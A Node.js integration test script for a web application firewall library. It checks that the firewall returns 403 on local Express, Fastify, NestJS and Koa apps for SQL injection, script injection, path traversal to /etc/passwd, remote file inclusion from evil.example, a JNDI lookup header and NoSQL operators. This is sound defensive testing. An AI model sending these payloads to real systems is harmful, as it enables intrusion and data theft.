#!/usr/bin/env node
/**
 * Mini-WAF integration scenario runner.
 *
 * Usage:
 *   node scenarios/run.mjs              # start apps, test, teardown
 *   node scenarios/run.mjs --no-start   # apps already listening
 */

import { spawn } from 'node:child_process';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';
import path from 'node:path';
import express from 'express';
import { expressWaf } from 'mini-waf/express';
import { nestMiddleware } from 'mini-waf/nestjs';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const INTEGRATION_ROOT = path.resolve(__dirname, '..');
const HOST = process.env.INTEGRATION_HOST || '127.0.0.1';
const NO_START = process.argv.includes('--no-start');
const RUN_RATE_LIMIT =
  process.env.RUN_RATE_LIMIT === '1' || process.env.SKIP_RATE_LIMIT === '0';

const TARGETS = [
  { name: 'express', port: Number(process.env.EXPRESS_PORT || 3101), dir: 'express', cmd: ['npm', 'start'] },
  { name: 'fastify', port: Number(process.env.FASTIFY_PORT || 3102), dir: 'fastify', cmd: ['npm', 'start'] },
  {
    name: 'nestjs-express',
    port: Number(process.env.NEST_PORT || 3103),
    dir: 'nestjs-express',
    cmd: ['npm', 'start'],
  },
  {
    name: 'koa',
    port: Number(process.env.KOA_PORT || 3104),
    dir: 'koa',
    cmd: ['npm', 'start'],
  },
];

const children = [];
let failed = 0;
let passed = 0;
let skipped = 0;

function log(msg) {
  console.log(msg);
}

function resultLine(ok, label, detail = '') {
  if (ok) {
    passed += 1;
    log(`  PASS  ${label}${detail ? ` — ${detail}` : ''}`);
  } else {
    failed += 1;
    log(`  FAIL  ${label}${detail ? ` — ${detail}` : ''}`);
  }
}

function skipLine(label, reason) {
  skipped += 1;
  log(`  SKIP  ${label} — ${reason}`);
}

async function sleep(ms) {
  await new Promise((r) => setTimeout(r, ms));
}

async function waitForServer(port, timeoutMs = 30_000) {
  const started = Date.now();
  while (Date.now() - started < timeoutMs) {
    try {
      const res = await fetch(`http://${HOST}:${port}/health`);
      if (res.status === 200 || res.status === 403) {
        return;
      }
    } catch {
      // not up yet
    }
    await sleep(200);
  }
  throw new Error(`Server on :${port} did not become ready within ${timeoutMs}ms`);
}

function startApp(target) {
  const cwd = path.join(INTEGRATION_ROOT, target.dir);
  const child = spawn(target.cmd[0], target.cmd.slice(1), {
    cwd,
    env: { ...process.env, PORT: String(target.port) },
    stdio: ['ignore', 'pipe', 'pipe'],
    detached: true,
  });
  children.push(child);
  child.stdout.on('data', (buf) => {
    const line = String(buf).trim();
    if (line) log(`  [${target.name}] ${line}`);
  });
  child.stderr.on('data', (buf) => {
    const line = String(buf).trim();
    if (line) log(`  [${target.name}:err] ${line}`);
  });
  child.on('exit', (code, signal) => {
    if (code && code !== 0) {
      log(`  [${target.name}] exited code=${code} signal=${signal}`);
    }
  });
  return child;
}

function stopAll() {
  for (const child of children) {
    if (!child.killed) {
      try {
        child.kill('SIGTERM');
      } catch {
        // ignore
      }
      // Kill the whole process group if possible (npm start spawns a child).
      try {
        if (child.pid) process.kill(-child.pid, 'SIGTERM');
      } catch {
        // ignore (may not be a process group leader)
      }
    }
  }
}

async function request(port, pathname, init = {}) {
  const url = `http://${HOST}:${port}${pathname}`;
  const res = await fetch(url, {
    redirect: 'manual',
    ...init,
    headers: {
      ...(init.headers || {}),
    },
  });
  const text = await res.text().catch(() => '');
  return { status: res.status, text };
}

async function expectStatus(target, label, pathname, expected, init) {
  try {
    const { status, text } = await request(target.port, pathname, init);
    const ok = Array.isArray(expected)
      ? expected.includes(status)
      : status === expected;
    resultLine(
      ok,
      `${target.name} · ${label}`,
      ok ? `status ${status}` : `expected ${expected}, got ${status} (${text.slice(0, 80)})`,
    );
  } catch (err) {
    resultLine(false, `${target.name} · ${label}`, String(err.message || err));
  }
}

async function runCoreScenarios(target) {
  log(`\n== ${target.name} (:${target.port}) ==`);

  await expectStatus(target, '1 clean GET /', '/', 200);

  await expectStatus(
    target,
    '2 SQLi query',
    `/search?q=${encodeURIComponent("1' OR 1=1")}`,
    403,
  );

  await expectStatus(
    target,
    '3 XSS query',
    `/search?q=${encodeURIComponent('<script>alert(1)</script>')}`,
    403,
  );

  await expectStatus(
    target,
    '4 path traversal',
    `/search?q=${encodeURIComponent('../../etc/passwd')}`,
    403,
  );

  await expectStatus(
    target,
    '5 RFI remote URL',
    `/search?q=${encodeURIComponent('http://evil.example/shell.txt')}`,
    403,
  );

  await expectStatus(
    target,
    '5b RFI php:// stream wrapper',
    `/search?q=${encodeURIComponent('php://filter/convert.base64-encode/resource=index')}`,
    403,
  );

  await expectStatus(target, '6 scanner UA sqlmap', '/', 403, {
    headers: { 'user-agent': 'sqlmap/1.7#integration' },
  });

  // Log4Shell-style lookup smuggled through a header, not the query string.
  await expectStatus(target, '6b JNDI lookup in header', '/', 403, {
    headers: { 'user-agent': '${jndi:ldap://evil.example/a}' },
  });

  await expectStatus(target, '6c NoSQL operator in body', '/echo', 403, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ user: { $ne: null }, pass: { $ne: null } }),
  });

  await expectStatus(target, '7 health clean', '/health', 200);

  await expectStatus(target, '8 POST body SQLi', '/echo', 403, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ msg: "1 OR 1=1" }),
  });

  await expectStatus(target, '8b POST body XSS', '/echo', 403, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ msg: '<script>x</script>' }),
  });

  if (RUN_RATE_LIMIT) {
    let blocked = false;
    let lastStatus = 0;
    for (let i = 0; i < 150; i += 1) {
      const { status } = await request(target.port, '/');
      lastStatus = status;
      if (status === 403) {
        blocked = true;
        break;
      }
    }
    resultLine(
      blocked,
      `${target.name} · 9 rate-limit`,
      blocked ? 'got 403' : `no 403 after 150 reqs (last ${lastStatus})`,
    );
  } else {
    skipLine(
      `${target.name} · 9 rate-limit`,
      'optional (set RUN_RATE_LIMIT=1); default max=120/60s is flaky in suites',
    );
  }
}

// Every SQLi rule that can match `1' OR 1=1` on the query string; the smoke
// test asserts that turning them all off lets the payload through.
const DISABLED_SQLI_IDS = [
  'preset-sqli-classic-query',
  'preset-sqli-advanced-query',
  'preset-sqli-tautology',
];

const CUSTOM_BLOCK_RULE = {
  id: 'integration-block-path',
  priority: 10,
  action: 'block',
  minLevel: 'low',
  reason: 'integration custom block',
  when: { field: 'path', equals: '/blocked' },
};

async function withEphemeralServer(setup, run) {
  const app = express();
  setup(app);
  const server = await new Promise((resolve) => {
    const s = app.listen(0, HOST, () => resolve(s));
  });
  const { port } = server.address();
  try {
    await run(port);
  } finally {
    await new Promise((resolve) => server.close(resolve));
  }
}

/**
 * Express 4's default query parser — and Express 5 with `query parser`
 * set to `extended` — turns `?user[$ne]=null` into a nested object. The WAF
 * has to flatten that without throwing, and still see the operator.
 */
async function runNestedQuerySmoke() {
  log('\n== ephemeral · nested query parser ==');

  await withEphemeralServer(
    (app) => {
      app.set('query parser', 'extended');
      app.use(expressWaf({ presets: ['default'], level: 'balanced' }));
      app.get('/search', (req, res) => res.json({ ok: true }));
    },
    async (port) => {
      const attack = await request(port, '/search?user[$ne]=null');
      resultLine(
        attack.status === 403,
        'express · 11 nested query NoSQL operator blocked',
        `status ${attack.status}`,
      );

      const clean = await request(port, '/search?filter[status]=open');
      resultLine(
        clean.status === 200,
        'express · 11b nested query clean request allowed',
        `status ${clean.status}`,
      );
    },
  );
}

async function runDisabledRuleIdsSmoke() {
  log('\n== ephemeral · disabledRuleIds ==');
  const wafOpts = {
    presets: ['default'],
    level: 'balanced',
    disabledRuleIds: DISABLED_SQLI_IDS,
  };

  await withEphemeralServer(
    (app) => {
      app.use(express.json());
      app.use(expressWaf(wafOpts));
      app.get('/search', (req, res) => res.json({ q: req.query.q }));
    },
    async (port) => {
      const { status } = await request(
        port,
        `/search?q=${encodeURIComponent("1' OR 1=1")}`,
      );
      resultLine(
        status === 200,
        'express · 10 disabledRuleIds (SQLi query allowed)',
        `status ${status}`,
      );
    },
  );

  // Nest middleware path (same Express transport; covers nestMiddleware / Nest adapter).
  await withEphemeralServer(
    (app) => {
      app.use(express.json());
      app.use(nestMiddleware(wafOpts));
      app.get('/search', (req, res) => res.json({ q: req.query.q }));
    },
    async (port) => {
      const { status } = await request(
        port,
        `/search?q=${encodeURIComponent("1' OR 1=1")}`,
      );
      resultLine(
        status === 200,
        'nestjs · 10 disabledRuleIds (SQLi query allowed)',
        `status ${status}`,
      );
    },
  );
}

async function runCustomRuleSmoke() {
  log('\n== ephemeral · custom rule ==');
  const wafOpts = {
    presets: ['default'],
    level: 'balanced',
    rules: [CUSTOM_BLOCK_RULE],
  };

  await withEphemeralServer(
    (app) => {
      app.use(expressWaf(wafOpts));
      app.get('/blocked', (_req, res) => res.send('should not reach'));
      app.get('/ok', (_req, res) => res.send('ok'));
    },
    async (port) => {
      const blocked = await request(port, '/blocked');
      const ok = await request(port, '/ok');
      resultLine(
        blocked.status === 403,
        'express · 10b custom rule blocks /blocked',
        `status ${blocked.status}`,
      );
      resultLine(
        ok.status === 200,
        'express · 10b custom rule allows /ok',
        `status ${ok.status}`,
      );
    },
  );

  await withEphemeralServer(
    (app) => {
      app.use(nestMiddleware(wafOpts));
      app.get('/blocked', (_req, res) => res.send('should not reach'));
      app.get('/ok', (_req, res) => res.send('ok'));
    },
    async (port) => {
      const blocked = await request(port, '/blocked');
      const ok = await request(port, '/ok');
      resultLine(
        blocked.status === 403,
        'nestjs · 10b custom rule blocks /blocked',
        `status ${blocked.status}`,
      );
      resultLine(
        ok.status === 200,
        'nestjs · 10b custom rule allows /ok',
        `status ${ok.status}`,
      );
    },
  );
}

async function main() {
  log('Mini-WAF integration scenarios');
  log(`host=${HOST} noStart=${NO_START} rateLimit=${RUN_RATE_LIMIT}`);

  // Ensure local package resolves (integration/node_modules or express's)
  try {
    createRequire(path.join(INTEGRATION_ROOT, 'package.json')).resolve('mini-waf');
  } catch {
    createRequire(path.join(INTEGRATION_ROOT, 'express', 'package.json')).resolve(
      'mini-waf',
    );
  }

  if (!NO_START) {
    log('\nStarting apps...');
    for (const target of TARGETS) {
      startApp(target);
    }
    for (const target of TARGETS) {
      await waitForServer(target.port);
      log(`  ready ${target.name} :${target.port}`);
    }
  } else {
    for (const target of TARGETS) {
      await waitForServer(target.port, 5_000);
    }
  }

  try {
    for (const target of TARGETS) {
      await runCoreScenarios(target);
    }
    await runNestedQuerySmoke();
    await runDisabledRuleIdsSmoke();
    await runCustomRuleSmoke();
  } finally {
    if (!NO_START) {
      log('\nTearing down...');
      stopAll();
      await sleep(400);
      for (const child of children) {
        try {
          if (child.pid) process.kill(-child.pid, 'SIGKILL');
        } catch {
          // already gone
        }
      }
    }
  }

  log(`\nSummary: ${passed} passed, ${failed} failed, ${skipped} skipped`);
  process.exit(failed > 0 ? 1 : 0);
}

process.on('SIGINT', () => {
  stopAll();
  process.exit(130);
});
process.on('SIGTERM', () => {
  stopAll();
  process.exit(143);
});

main().catch((err) => {
  console.error(err);
  stopAll();
  process.exit(1);
});
